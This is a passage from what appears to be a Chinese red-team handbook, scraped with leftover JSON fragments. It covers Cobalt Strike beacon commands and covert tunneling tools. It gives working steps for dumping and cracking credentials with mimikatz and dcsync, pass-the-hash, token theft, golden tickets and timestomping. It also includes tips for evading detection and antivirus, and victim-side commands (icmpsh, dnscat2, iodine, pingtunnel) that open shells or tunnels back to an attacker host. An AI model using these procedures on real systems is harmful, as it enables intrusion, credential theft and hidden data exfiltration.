\u5982\u56febeacon\u4f1a\u8bdd\u6846\u8f93\u51fa\u4e86\u76ee\u6807\u673a\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801hash\u503c \u4ee5\u672c\u6b21\u5bfc\u51fa\u7684\u4e00\u4e2a\u51ed\u636e\u4e3a\u4f8b f4bb18c1165a89248f9e853b269a8995\u4e3aadmin\u7528\u6237\u7684NTLM Hash \u6211\u4eec\u53ef\u4ee5\u53bbcmd5\u7b49\u5e73\u53f0\u7834\u89e3\u8be5NTLM\u5bc6\u6587\uff0c\u5982\u56fe\uff0c\u7834\u89e3\u540e\u660e\u6587\u4e3aAbc123 Mimikatz\u5bfc\u51fa\u51ed\u636e \u9009\u62e9\u6267\u884c\u2013>Run Mimikatz\uff0c\u6216\u5728beacon\u4e2d\u6267\u884clogonpasswords\u547d\u4ee4\u5f53\u4f1a\u8bdd\u4e3a\u7ba1\u7406\u5458\u6743\u9650 \u65f6\uff0c\u624d\u80fddump\u6210\u529f\uff0c\u5982\u679c\u6743\u9650\u5f88\u4f4e\uff0c\u8bf7\u5148\u63d0\u6743\uff0c\u7136\u540e\u5728\u5b9e\u6218\u4e2d\u4f7f\u7528\u8981\u8fdb\u884c\u514d\u6740\u5904\u7406\u3002 1 admin:1022:aad3b435b51404eeaad3b435b51404ee:f4bb18c1165a89248f9e853b269a8995: \u4e5f\u53ef\u4ee5\u5728beacon\u4e2d\u8f93\u5165\u547d\u4ee4 \u4f7f\u7528dcsync [DOMAIN.FQDN]\u4ece\u57df\u63a7\u5236\u5668\u63d0\u53d6\u6240\u6709\u5e10\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u3002 \u6b64\u6280\u672f\u4f7f\u7528Windows API\u6765\u5728\u57df\u63a7\u5236\u5668\u4e4b\u95f4\u540c\u6b65\u4fe1\u606f\u3002\u5b83\u9700\u8981\u57df\u7ba1\u7406\u5458\u4fe1\u4efb\u5173\u7cfb\u3002 CS\u4e2d\u4f7f\u7528mimikatz\u6765\u6267\u884c\u6b64\u6280\u672f\u3002 \u4f7f\u7528\u6761\u4ef6\uff1aadministrator\u7528\u6237\u6743\u9650 \u4f8b\u5982\uff1a\u5728administrator\u6743\u9650\u4e2d\u4f7f\u7528 \u5728system\u6743\u9650\u4e2d \u5982\u679c\u8981\u7279\u5b9a\u7684\u5bc6\u7801\u54c8\u5e0c\uff0c\u8bf7\u4f7f\u7528 dcsync [DOMAIN.FQDN] [DOMAIN user]\u3002 \u4f8b\u5982\uff1a\u6211\u4eec\u62ffmssql\u7684 16.\u7aef\u53e3\u626b\u63cf cs\u5177\u6709\u5185\u7f6e\u7684\u7aef\u53e3\u626b\u63cf\u7a0b\u5e8f\u3002 \u53ef\u4ee5\u6307\u5b9a\u76ee\u6807\u8303\u56f4\u7684\u9017\u53f7\u5206\u9694\u5217\u8868\u3002\u7aef\u53e3\u4e5f\u662f\u5982\u6b64\u3002\u4f8b\u5982\uff0c\u7aef\u53e3\u626b\u63cf172.16.48.0/24 1- 1024,8080\u5c06\u626b\u63cf\u7aef\u53e31\u81f31024\u548c8080\u4e0a\u7684\u4e3b\u673a172.16.48.0\u81f3172.16.48.255\u3002 \u6709\u4e09\u4e2a\u76ee\u6807\u53d1\u73b0\u9009\u9879\u3002 \u4f7f\u7528portscan [\u76ee\u6807] [\u7aef\u53e3] [\u53d1\u73b0\u65b9\u6cd5]\u542f\u52a8\u7aef\u53e3\u626b\u63cf\u7a0b\u5e8f\u4f5c\u4e1a\u3002 arp\u65b9\u6cd5\u4f7f\u7528ARP\u8bf7\u6c42\u6765\u53d1\u73b0\u4e3b\u673a\u662f\u5426\u8fd8\u6d3b\u7740\u3002 1 1 2 \u7aef\u53e3\u626b\u63cf\u5668\u5c06\u5728beacon\u4e4b\u95f4\u8fd0\u884c\u3002\u5f53\u6709\u8981\u62a5\u544a\u7684\u7ed3\u679c\u65f6\uff0c\u5b83\u5c06\u628a\u5b83\u4eec\u53d1\u9001\u5230\u63a7\u5236\u53f0\u3002 Cobalt Strike\u5c06\u5904\u7406\u6b64\u4fe1\u606f\uff0c\u5e76\u4f7f\u7528\u53d1\u73b0\u7684\u4e3b\u673a\u66f4\u65b0\u76ee\u6807\u3002 \u6ce8\u610f\uff1a\u626b\u63cf\u7684\u4e0d\u540c\u65b9\u6cd5\u6709\u4e0d\u540c\u7684\u52a8\u4f5c\uff08\u6d41\u91cf\uff09\uff0c\u626b\u63cf\u53ef\u80fd\u4f1a\u8ba9\u84dd\u65b9\u68c0\u6d4b\u5e76\u53d1\u73b0\u6211\u4eec\u3002\u4f7f \u7528\u4e4b\u524d\u5e94\u8be5\u6ce8\u610f\u3002\u53ef\u4ee5\u5728\u665a\u4e0a\u8fdb\u884c\u626b\u63cf\u3002 \u4f8b\u5982\uff1a icmp\u65b9\u6cd5\u53d1\u9001ICMP\u56de\u663e\u8bf7\u6c42\uff0c\u4ee5\u68c0\u67e5\u76ee\u6807\u662f\u5426\u5b58\u5728\u3002 none\u9009\u9879\u544a\u8bc9portscan\u5de5\u5177\u5047\u5b9a\u6240\u6709\u4e3b\u673a\u5747\u5904\u4e8e\u6d3b\u52a8\u72b6\u6001\u3002 3 4 5 17.\u7f51\u7edc\u548c\u4e3b\u673a\u679a\u4e3e \u4fe1\u6807\u7f51\u7edc\u6a21\u5757\u63d0\u4f9b\u4e86\u5728Windows\u6d3b\u52a8\u76ee\u5f55\u7f51\u7edc\u4e2d\u67e5\u8be2\u548c\u53d1\u73b0\u76ee\u6807\u7684\u5de5\u5177\u3002 net\u547d\u4ee4\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528help net \u547d\u4ee4\u770b\u770b \u4fe1\u6807\u7684\u4e3b\u673a\u548c\u7f51\u7edc\u679a\u4e3e\u5de5\u5177\u3002\u5185\u7f6e\u7684net\u547d\u4ee4\u5305\u62ec\uff1a 1 \u8bed\u6cd5\uff1anet [command \u547d\u4ee4] [arguments/\u53c1\u6570] \u4f7f\u7528net dclist\u547d\u4ee4\u67e5\u627e\u76ee\u6807\u52a0\u5165\u5230\u7684\u57df\u7684\u57df\u63a7\u5236\u5668\u3002 Command Description computers lists hosts in a domain (groups) domain display domain for this host dclist lists domain controllers domain_controllers lists DCs in a domain (groups) domain_trusts lists domain trusts group lists groups and users in groups localgroup lists local groups and users in local groups logons lists users logged onto a host sessions lists sessions on a host share lists shares on a host user lists users and user information time show time for a host view lists hosts in a domain (browser service) 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u4f7f\u7528net view\u547d\u4ee4\u5728\u76ee\u6807\u52a0\u5165\u7684\u57df\u4e2d\u67e5\u627e\u76ee\u6807\u3002 \u8fd9\u4e24\u4e2a\u547d\u4ee4\u4e5f\u5c06\u586b\u5145\u76ee\u6807\u6a21\u578b\u3002 \u8be5\u547d\u4ee4\u901a\u8fc7\u5728\u57df\u63a7\u5236\u5668\u4e0a\u67e5\u8be2\u8ba1\u7b97\u673a\u5e10\u6237\u7ec4\u627e\u5230\u76ee\u6807\u3002 cs\u7684net\u6a21\u5757\u5305\u542b\u5728Windows\u7f51\u7edc\u679a\u4e3eAPI\u4e4b\u4e0a\u6784\u5efa\u7684\u547d\u4ee4\u3002\u8fd9\u4e9b\u547d\u4ee4\u662fWindows\u4e2d\u8bb8\u591a \u5185\u7f6enet\u547d\u4ee4\u7684\u76f4\u63a5\u66ff\u4ee3\u3002 \u8fd9\u91cc\u4e5f\u6709\u4e00\u4e9b\u72ec\u7279\u7684\u529f\u80fd\uff0c\u5f53\u6211\u4eec\u5fc5\u987b\u67e5\u627e\u8c01\u662f\u53e6\u4e00\u4e2a\u7cfb\u7edf\u4e0a\u7684\u672c\u5730\u7ba1\u7406\u5458\u65f6\uff0c\u8fd9\u4e9b\u547d \u4ee4\u5728\u6a2a\u5411\u79fb\u52a8\u671f\u95f4\u975e\u5e38\u6709\u7528\u3002 \u4f8b\u5982\uff0c \u4f7f\u7528net localgroup \\ \u4e3b\u673a \u5217\u51fa\u53e6\u4e00\u4e2a\u7cfb\u7edf\u4e0a\u7684\u7ec4\u3002 \u4f7f\u7528net localgroup \\ \u4e3b\u673a \u7ec4\u540d \u53ef\u4ee5\u5217\u51fa\u53e6\u4e00\u4e2a\u7cfb\u7edf\u4e0a\u7ec4\u7684\u6210\u5458\u3002 1 1 18.\u4fe1\u4efb\u5173\u7cfb \u5f53\u7528\u6237\u767b\u5f55Windows\u4e3b\u673a\u65f6\uff0c\u5c06\u751f\u6210\u8bbf\u95ee\u4ee4\u724c\u3002\u8be5\u4ee4\u724c\u5305\u542b\u6709\u5173\u7528\u6237\u53ca\u5176\u6743\u9650\u7684\u4fe1\u606f\u3002 \u8bbf\u95ee\u4ee4\u724c\u8fd8\u4fdd\u5b58\u5c06\u7528\u6237\u8ba4\u8bc1\u5230\u540c\u4e00Active Directory\u57df\u4e0a\u7684\u53e6\u4e00\u4e2a\u7cfb\u7edf\u6240\u9700\u7684\u4fe1\u606f\u3002\u6211\u4eec \u53ef\u4ee5\u4ece\u5176\u4ed6\u8fdb\u7a0b\u4e2d\u7a83\u53d6\u4ee4\u724c\u5e76\u5c06\u5176\u5e94\u7528\u4e8e\u6211\u4eec\u7684\u4fe1\u6807\u3002\u6267\u884c\u6b64\u64cd\u4f5c\u65f6\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5 \u4e0e\u8be5\u7528\u6237\u5728\u57df\u4e0a\u7684\u5176\u4ed6\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\u3002 \u4f7f\u7528steal_token\u53ef\u4ee5\u6a21\u62df\u73b0\u6709\u8fdb\u7a0b\u4e2d\u7684\u4ee4\u724c\u3002 \u5229\u7528\u624b\u6cd5\uff1a ps\u5217\u51fa\u5f53\u524d\u8fdb\u7a0b\u5217\u8868 \u6211\u4eec\u6765\u770b\u770b\u5229\u7528pid 1712 \u7684\u5427 \u8fd9\u662f360\u54c8\u54c8\u54c8\u54c8 1 \u8bed\u6cd5\uff1asteal_token [pid] \u5982\u679c\u6211\u4eec\u77e5\u9053\u7528\u6237\u7684\u51ed\u636e\uff1b\u4f7f\u7528make_token\u751f\u6210\u4f20\u9012\u8fd9\u4e9b\u51ed\u636e\u7684\u4ee4\u724c\u3002\u8be5\u4ee4\u724c\u662f\u6211\u4eec\u5f53 \u524d\u4ee4\u724c\u7684\u526f\u672c\uff0c\u5e26\u6709\u5df2\u4fee\u6539\u7684\u5355\u70b9\u767b\u5f55\u4fe1\u606f\u3002\u5b83\u5c06\u663e\u793a\u60a8\u5f53\u524d\u7684\u7528\u6237\u540d\u3002 \u8d26\u53f7\u5bc6\u7801\u53ef\u4ee5\u4f7f\u7528mimikatz dump\u3002 \u4f7f\u7528mimikatz\u4e0eBeacon\u8fdb\u884c\u54c8\u5e0c\u6df7\u5408\u3002\u547d\u4ee4pth\u5c06\u521b\u5efa\u5e76\u6a21\u62df\u8bbf\u95ee\u4ee4\u724c\u4ee5\u4f20\u9012\u6307\u5b9a\u7684\u54c8 \u5e0c\u3002 \u8bed\u6cd5\uff1a make_token [DOMAIN\\user] [password] \u8bed\u6cd5\uff1apth [DOMAIN\\user] [NTLM hash] getuid\u547d\u4ee4\u5c06\u6253\u5370\u60a8\u5f53\u524d\u7684\u4ee4\u724c\u3002 \u4f7f\u7528rev2self\u8fd8\u539f\u4e3a\u539f\u59cb\u4ee4\u724c\u3002 1 1 1 2 \ue10d Kerberos\u7968\u8bc1 \u5c1d\u8bd5\u4f7f\u7528mimikatz 2.0\u751f\u6210\u7684\u91d1\u7968\u3002 \u4f7f\u7528\u5c06Kerberos\u7968\u8bc1\u6ce8\u5165\u5f53\u524d\u4f1a\u8bdd\u3002 \u8fd9\u5c06\u4f7fBeacon\u53ef\u4ee5\u4f7f\u7528\u8be5\u7968\u8bc1\u4e2d\u7684\u6743\u9650\u4e0e\u8fdc\u7a0b\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\u3002 \u4f7f\u7528kerberos_ticket_purge\u6e05\u9664\u4e0e\u6211\u4eec\u7684\u4f1a\u8bdd\u5173\u8054\u7684\u4efb\u4f55kerberos\u51ed\u5355 19.\u5176\u4ed6\u547d\u4ee4 \u4fe1\u6807\u8fd8\u6709\u5176\u4ed6\u4e00\u4e9b\u4e0a\u9762\u6ca1\u6709\u63d0\u5230\u7684\u547d\u4ee4\u3002 \u5728\u660e\u786e\u7684\u547d\u4ee4\u5c06\u6e05\u9664\u706f\u5854\u7684\u4efb\u52a1\u5217\u8868\u3002\u5982\u679c\u8f93\u5165\u6709\u8bef\uff0c\u8bf7\u4f7f\u7528\u5b83\u3002 \u8f93\u5165exit\u8981\u6c42Beacon\u9000\u51fa\u3002 \u4f7f\u7528kill [pid]\u7ec8\u6b62\u8fdb\u7a0b\u3002 \u4f7f\u7528timestomp\u53ef\u4ee5\u5c06\u4e00\u4e2a\u6587\u4ef6\u7684\u201c\u4fee\u6539\u201d\uff0c\u201c\u8bbf\u95ee\u201d\u548c\u201c\u521b\u5efa\u201d\u65f6\u95f4\u4e0e\u53e6\u4e00\u4e2a\u6587\u4ef6\u7684\u201c\u4fee\u6539\u201d\uff0c\u201c\u8bbf \u95ee\u201d\u548c\u201c\u521b\u5efa\u201d\u65f6\u95f4\u8fdb\u884c\u5339\u914d\u3002 by\uff1a\u674e\u6728 \u5fae\u4fe1\u516c\u4f17\u53f7\u9ed1\u767d\u5929\u5b9e\u9a8c\u5ba4 1 \u8bed\u6cd5\uff1akerberos_ticket_use [/ path / to / ticket]","title":"Beacon Commands"},{"location":"redteam/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93/","text":"\u5728\u6e17\u900f\u7684\u65f6\u5019\u901a\u5e38\u6211\u4eec\u901a\u8fc7\u5404\u79cd\u6f0f\u6d1e\u83b7\u53d6\u5230\u67d0\u5185\u7f51\u8fb9\u754c\u673a\u5668\u7684\u6743\u9650\u540e,\u6211\u4eec\u9700\u8981\u8fdb\u884c\u4fe1\u606f\u6536\u96c6,\u5c3d\u53ef\u80fd\u7684\u6478\u6e05\u6574\u4e2a\u5185\u7f51\u7684\u7f51\u7edc\u62d3\u6251\u60c5\u51b5,\u5728\u6761\u4ef6\u6709\u9650\u7684\u60c5\u51b5\u65f6(\u8fb9\u754c\u673a\u5668\u6743\u9650\u4f4e,\u653b\u51fb\u65b9\u89c4\u5219\u4e0d\u5141\u8bb8\u8fdc\u7a0b\u767b\u5f55,\u8fb9\u754c\u673a\u5668\u4e3alinux)\u6211\u4eec\u5c31\u9700\u8981\u6839\u636e\u4e0d\u540c\u60c5\u51b5\u642d\u5efa\u4ee3\u7406,\u96a7\u9053,\u6216\u8005\u7aef\u53e3\u8f6c\u53d1\u73af\u5883,\u5c06\u6211\u4eec\u672c\u673a\u7684\u5de5\u5177\u6d41\u91cf\u5e26\u5165\u5230\u5185\u7f51\u73af\u5883,\u5bf9\u5185\u7f51\u73af\u5883\u8fdb\u884c\u6f2b\u6e38\u63a2\u6d4b \u901a\u5e38\u4f1a\u6709\u4ee5\u4e0b\u56db\u79cd\u60c5\u51b5 \u5185\u7f51\u9632\u706b\u5899\u5bf9\u51fa\u53e3\u6d41\u91cf\u6ca1\u6709\u4efb\u4f55\u7aef\u53e3\u9650\u5236\u3002 \u5185\u7f51\u7684\u9632\u706b\u5899\u53ea\u914d\u7f6e\u4e86\u5165\u7ad9\u89c4\u5219\u3002 \u5185\u7f51\u9632\u706b\u5899\u51fa\u7ad9\u5165\u7ad9\u89c4\u5219\u90fd\u914d\u7f6e\u4e86\u3002 \u5185\u7f51\u9632\u706b\u5899\u90fd\u914d\u7f6e\u4e86\u51fa\u5165\u7ad9\u89c4\u5219\u5e76\u4e14\u5177\u6709\u534f\u8bae\u68c0\u6d4b\u548c\u8bc6\u522b\u80fd\u529b\u4e14 \u4ec5\u5141\u8bb8HTTP\u6d41\u91cf\u51fa\u53bb\u5916\u7f51\u3002 0x01 socks\u4ee3\u7406\u670d\u52a1\u7aef\u7bc7 \u00b6 \u9488\u5bf9\u7b2c\u4e00\u79cd\u60c5\u51b5,\u7531\u4e8e\u9632\u706b\u5899\u5bf9\u51fa\u53e3\u6d41\u91cf\u6ca1\u6709\u4efb\u4f55\u7aef\u53e3\u9650\u5236,\u6211\u4eec\u7684\u53ef\u9009\u62e9\u7684\u65b9\u6848\u975e\u5e38\u7075\u6d3b.\u5e38\u7528\u7684\u65b9\u6cd5\u6709 1. \u6b63\u5411\u8fde\u63a5,\u5c06shell\u8f6c\u53d1\u5230\u67d0\u4e2a\u7aef\u53e3,\u6216\u8005\u5185\u7f51\u4e3b\u673a\u7684\u7aef\u53e3\u6216\u8005\u76d1\u542cSOCKS5\u7aef\u53e3\u5f00\u59cb\u76d1\u542c,\u7b49\u5f85\u5916\u9762\u7684\u653b\u51fb\u8005\u8fde\u63a5(\u6b64\u65f6,\u5916\u7f51\u7684\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u6765\u8fde\u63a5\u88ab\u653b\u51fb\u8005\u7684\u7aef\u53e3) \u53cd\u5411\u8fde\u63a5,\u53d7\u5bb3\u8005\u4e3b\u673a\u901a\u8fc7\u6307\u5b9a\u653b\u51fb\u8005\u6b63\u5728\u76d1\u542c\u7684IP\u548cport,\u5c06shell\u6216\u5185\u7f51\u7aef\u53e3\u7b49\u8f6c\u53d1\u5230\u653b\u51fb\u8005\u73af\u5883,\u4e5f\u53ef\u5b9e\u73b0socks5\u53cd\u5411\u4ee3\u7406\u3002 \u5176\u4e2d\u53ef\u4ee5\u7528\u6765\u505asocks5\u4ee3\u7406\u7684\u5de5\u5177\u6709: Frp: frp\u662f\u4e00\u4e2a\u9ad8\u6027\u80fd\u7684\u53cd\u5411\u4ee3\u7406\u5e94\u7528,\u53ef\u4ee5\u8f7b\u677e\u5730\u8fdb\u884c\u5185\u7f51\u7a7f\u900f,\u5bf9\u5916\u7f51\u63d0\u4f9b\u670d\u52a1,\u652f \u6301tcp,http,https\u7b49\u534f\u8bae\u7c7b\u578b\u3002 \u4e0b\u8f7d\u5730\u5740: https://github.com/fatedier/frp/releases \u63a8\u8350\u6587\u7ae0: https://www.jianshu.com/p/e0581ee84323 Earthworm(ew) \u4e00\u5957\u8f7b\u91cf\u4fbf\u643a\u4e14\u529f\u80fd\u5f3a\u5927\u7684\u7f51\u7edc\u7a7f\u900f\u5de5\u5177\uff0c\u57fa\u4e8e\u6807\u51c6C\u5f00\u53d1\uff0c\u5177\u6709socks5\u4ee3\u7406\u3001\u7aef \u53e3\u8f6c\u53d1\u548c\u7aef\u53e3\u6620\u5c04\u4e09\u5927\u529f\u80fd\u3002 \u4e0b\u8f7d\u5730\u5740:(\u6682\u4e0d\u63d0\u4f9b) \u63a8\u8350\u6587\u7ae0: http://rootkiter.com/EarthWorm/ Ssocks sSocks\u662f\u4e00\u4e2asocks\u4ee3\u7406\u5de5\u5177\u5957\u88c5\uff0c\u53ef\u7528\u6765\u5f00\u542fsocks\u4ee3\u7406\u670d\u52a1\uff0c\u652f\u6301socks5\u9a8c \u8bc1\uff0c\u652f\u6301IPV6\u548cUDP\uff0c\u5e76\u63d0\u4f9b\u53cd\u5411socks\u4ee3\u7406\u670d\u52a1\uff0c\u5373\u5c06\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4f5c\u4e3asocks\u4ee3 \u7406\u670d\u52a1\u7aef\uff0c\u53cd\u5f39\u56de\u672c\u5730\uff0c\u6781\u5927\u65b9\u4fbf\u5185\u7f51\u7684\u6e17\u900f\u6d4b\u8bd5 \u4e0b\u8f7d\u5730\u5740:( http://sourceforge.net/projects/ssocks/ ) \u63a8\u8350\u6587\u7ae0: https://blog.csdn.net/God_XiangYu/article/details/100132 929 msf\u505asocks\u4ee3\u7406 \u63a8\u8350\u6587\u7ae0: https://www.cnblogs.com/dgjnszf/p/12114358.html CobaltStrike\u505asocks\u4ee3\u7406 \u63a8\u8350\u6587\u7ae0: https://www.secshi.com/6575.htms \u9488\u5bf9\u7b2c\u4e8c\u79cd\u60c5\u51b5,\u6211\u4eec\u53ef\u4ee5\u53cd\u5411\u8fde\u63a5\u53d7\u5bb3\u8005\u4e3b\u673a,\u901a\u8fc7\u6307\u5b9a\u653b\u51fb\u8005 \u6b63\u5728\u76d1\u542c\u7684IP\u548cport,\u5c06shell,\u5185\u7f51\u7aef\u53e3\u7b49\u8f6c\u53d1\u5230\u653b\u51fb\u8005\u56e0\u4e3a\u53ea\u9650\u5236\u5165 \u7ad9\u6d41\u91cf,\u51fa\u7ad9\u672a\u505a\u9650\u5236,\u6240\u4ee5\u505asocks\u4ee3\u7406\u65b9\u6cd5\u4f9d\u7136\u9002\u7528 0x02 \u9690\u853d\u96a7\u9053\u7bc7 \u00b6 \u9488 \u5bf9 \u7b2c \u4e09 \u79cd \u548c \u7b2c \u56db \u79cd \u60c5 \u51b5 , socks\u4ee3\u7406\u7684\u65b9\u6cd5\u5c31\u53d7\u9650\u5236,\u56e0\u4e3a\u7aef\u53e3\u6709\u9650,\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u9690\u853d\u96a7\u9053\u6280\u672f ,\u628a\u5185\u7f51\u670d\u52a1\u5668\u7684\u7aef\u53e3\u901a\u8fc7http/https\uff0cICMP\uff0cDNS\u96a7\u9053\u8f6c\u53d1\u5230\u672c\u673a, \u5f62\u6210\u4e00\u4e2a\u56de\u8def\u3002\u7528\u4e8e\u76ee\u6807\u670d\u52a1\u5668\u5728\u5185\u7f51\u6216\u505a\u4e86\u7aef\u53e3\u7b56\u7565\u7684\u60c5\u51b5\u4e0b\u8fde\u63a5 \u76ee\u6807\u670d\u52a1\u5668\u5185\u90e8\u5f00\u653e\u7aef\u53e3\u3002\u5b83\u5229\u7528webshell\u5efa\u7acb\u4e00\u4e2asocks\u4ee3\u7406\u8fdb\u884c \u5185\u7f51\u7a7f\u900f\u5e38\u89c1\u7684\u9690\u853d\u96a7\u9053\u5de5\u5177\u6709\u4ee5\u4e0b\u51e0\u79cd\u3002 \u4e00\u3001ICMP\u96a7\u9053 \u00b6 ICMP\u96a7\u9053\u7684\u539f\u7406\uff1a\u57fa\u4e8eIP\u534f\u8bae\uff0c\u5c06TCP/UDP\u6570\u636e\u5305\u5c01\u88c5\u5230ICMP\u6570\u636e\u5305\u4e2d\uff0c\u7ed5\u8fc7\u9632\u706b\u5899\uff0c\u5b9e\u73b0\u51fa\u7f51\u3002ICMP\u96a7\u9053\u7684\u5e94\u7528\u573a\u666f\uff1a\u4e0a\u5c42\u534f\u8bae\u4f8b\u5982HTTP\u534f\u8bae\u3001DNS\u534f\u8bae\u548c\u6b63\u53cd\u5411\u7aef\u53e3\u8f6c\u53d1\u90fd\u5931\u8d25\u65f6\uff0c\u53ef\u4ee5\u5c1d\u8bd5ICMP\u51fa\u7f51\u3002ICMP\u7684\u5e38\u7528\u5de5\u5177\uff1aicmpsh\u3001icmptunnel\u3001ptun 1\u3001icmpsh \u5de5\u5177\u5b89\u88c5 git clone https://github.com/inquisb/icmpsh.git #\u4e0b\u8f7d\u5730\u5740 apt-get install python-impacket #\u5b89\u88c5\u4f9d\u8d56 sysctl -w net.ipv4.icmp_echo_ignore_all=1 \u5173\u95ed\u672c\u5730\u7684ICMP\u5e94\u7b54 \u00b6 \u88ab\u653b\u51fb\u8005\u6267\u884c icmpsh.exe -t \u653b\u51fb\u8005IP \u653b\u51fb\u8005\u6267\u884c python icmpsh_m.py \u653b\u51fb\u8005IP \u88ab\u653b\u51fb\u8005IP 2\u3001icmptunnel \u5de5\u5177\u5b89\u88c5 git clone https://github.com/jamesbarlow/icmptunnel.git cd icmptunnel make sysctl -w net.ipv4.icmp_echo_ignore_all=1 \u5173\u95ed\u672c\u5730\u7684ICMP\u5e94\u7b54 \u00b6 \u653b\u51fb\u8005\u6267\u884c \u4e00\u4e2a\u7ec8\u7aef\u6267\u884c ./icmptunnel \u2013s \u53e6\u4e00\u4e2a\u7ec8\u7aef\u6267\u884c /sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0 \u88ab\u653b\u51fb\u8005\u6267\u884c \u4e00\u4e2a\u7ec8\u7aef\u6267\u884c sysctl -w net.ipv4.icmp_echo_ignore_all=1 ./icmptunnel \u653b\u51fb\u8005IP \u53e6\u4e00\u4e2a\u7ec8\u7aef\u6267\u884c /sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0 3\u3001ptunnel \u5de5\u5177\u5b89\u88c5 wget https://github.com/esrrhs/pingtunnel/releases(\u6700\u65b0\u7684release\u4e0b\u8f7d\u5730 \u5740) sudo unzip pingtunnel_linux64.zip \u653b\u51fb\u8005\u6267\u884c echo 1 >/proc/sys/net/ipv4/icmp_echo_ignore_all sudo ./pingtunnel -type server \u88ab\u653b\u51fb\u8005\u6267\u884c // client, Forward udp pingtunnel -type client -l LOCAL_IP:4455 -s SERVER_IP -t SERVER_IP:4455 // client, Forward tcp pingtunnel -type client -l LOCAL_IP:4455 -s SERVER_IP -t SERVER_IP:4455 -tcp 1 // client, Forward sock5, implicitly open tcp, so no target server is needed pingtunnel -type client -l LOCAL_IP:4455 -s SERVER_IP -sock5 1 \u4e8c\u3001DNS\u96a7\u9053 DNS\u96a7\u9053\u7684\u539f\u7406\uff1a\u57fa\u4e8eUDP\u534f\u8bae\uff0c\u5c06TCP/UDP\u6570\u636e\u5305\u5c01\u88c5\u5230dns\u7684 \u6570\u636e\u5305\u4e2d\uff0c\u7ed5\u8fc7\u9632\u706b\u5899\uff0c\u5b9e\u73b0\u51fa\u7f51\u3002 DNS\u96a7\u9053\u7684\u5e94\u7528\u573a\u666f\uff1a\u4e0a\u5c42\u534f\u8bae\u4f8b\u5982HTTP\u534f\u8bae\u3001\u6b63\u53cd\u5411\u7aef\u53e3\u8f6c\u53d1\u90fd \u5931\u8d25\u65f6\uff0c\u53ef\u4ee5\u5c1d\u8bd5DNS\u534f\u8bae\u51fa\u7f51\u3002 DNS\u7684\u5e38\u7528\u5de5\u5177\uff1adnscat2\u3001dns2tcp\u3001iodine 1 \u3001 dnscat2 \u5de5\u5177\u5b89\u88c5 server\u7aef\u5b89\u88c5\uff1a\u9700\u8981ruby\u73af\u5883\u3001\u5b89\u88c5gem\u3001ruby\u3001dnscat2\u670d\u52a1\u7aef yum install gem rm /usr/bin/ruby wget https://cache.ruby-lang.org/pub/ruby/2.5/ruby-2.5.0.tar.gz tar -zxvf ruby-2.5.0.tar.gz cd ruby-2.5.0 mkdir -p /usr/local/ruby ./configure --prefix=/usr/local/ruby make && make install ln -s /usr/local/ruby/bin/ruby /usr/bin/ruby git clone https://github.com/iagox86/dnscat2.git cd /server gem install bunlder ln /usr/local/ruby/bin/bunlder /usr/bin/bunlder bunlder install \u5ba2\u6237\u7aef\u5b89\u88c5\uff1a \u4e0b\u8f7d\u5730\u4e3b\uff1a https://downloads.skullsecurity.org/dnscat2/ powershell\u5ba2\u6237\u7aef\uff1a https://codeload.github.com/lukebaggett/dnscat2 -powershell/zip/master \u653b\u51fb\u8005\u6267\u884c ruby dnscat2.rb yourdomain.****.top -e open -c password --no\ufffecache \u88ab\u653b\u51fb\u8005\u6267\u884c ./dnscat --secret=password yourdomain.target.com 2\u3001dns2tcp \u5de5\u5177\u5b89\u88c5 su - #\u8fdb\u5165root\u7528\u6237 apt-get install update apt-get install dns2tcp #\u5b9e\u9645\u4e0a\u662f\u540c\u65f6\u5b89\u88c5\u4e86dns2tcp\u7684\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef windows\u5ba2\u6237\u7aef\uff1a https://pan.baidu.com/s/1w-dpn0US9SmfjqdXuHS4aA\u63d0\u53d6\u7801 : tkgd) \u653b\u51fb\u8005\u6267\u884c dns2tcpd -f /etc/dns2tcpd.conf -F -d 2 \u88ab\u653b\u51fb\u8005\u6267\u884c ./dns2tcpc.exe -r c2 -z dnsc2.test.com target_ip -l 5353 -d 2 3\u3001iodine \u5de5\u5177\u5b89\u88c5 sudo apt-get install iodine \u653b\u51fb\u8005\u6267\u884c sudo iodined -c -P 123pass ClientIP(\u5ba2\u6237\u7aefIP) domain.com -DDD \u88ab\u653b\u51fb\u8005\u6267\u884c sudo iodine -f -P 123pass serverIP(\u670d\u52a1\u5668IP) domain.com -r \u4e09\u3001HTTP\u96a7\u9053\u5de5\u5177\u7bc7 HTTP\u96a7\u9053\u7684\u539f\u7406\uff1a\u57fa\u4e8eHTTP\u534f\u8bae\uff0c\u5c06TCP/UDP\u6570\u636e\u5305\u5c01\u88c5\u5230HTTP \u7684\u6570\u636e\u5305\u4e2d\uff0c\u7ed5\u8fc7\u9632\u706b\u5899\uff0c\u5b9e\u73b0\u51fa\u7f51\u3002 HTTP\u96a7\u9053\u7684\u5e94\u7528\u573a\u666f\uff1a\u53ea\u5141\u8bb8HTTP\u534f\u8bae\u51fa\u7f51\uff0c\u590d\u7528WEB\u7aef\u53e3\u3002 HTTP\u96a7\u9053\u7684\u5e38\u7528\u5de5\u5177\uff1aReduh\u3001Tunna\u3001reGeorg\u3001Weevely\u3001AB PTTS Reduh \u4f7f\u7528\u6761\u4ef6: 1.\u83b7\u53d6\u76ee\u6807\u670d\u52a1\u5668webshell,\u4e14\u53ef\u4ee5\u4e0a\u4f20reDuh\u670d\u52a1\u7aef\u5bf9\u5e94\u811a\u672c\u6587\u4ef6\u3002 2.\u77e5\u9053\u76ee\u6807\u670d\u52a1\u5668\u5f00\u653e\u7684\u5185\u7f51\u7aef\u53e3,\u5982\u8fdc\u7a0b\u684c\u9762\u7684\u7aef\u53e3\u662f3389\u3002 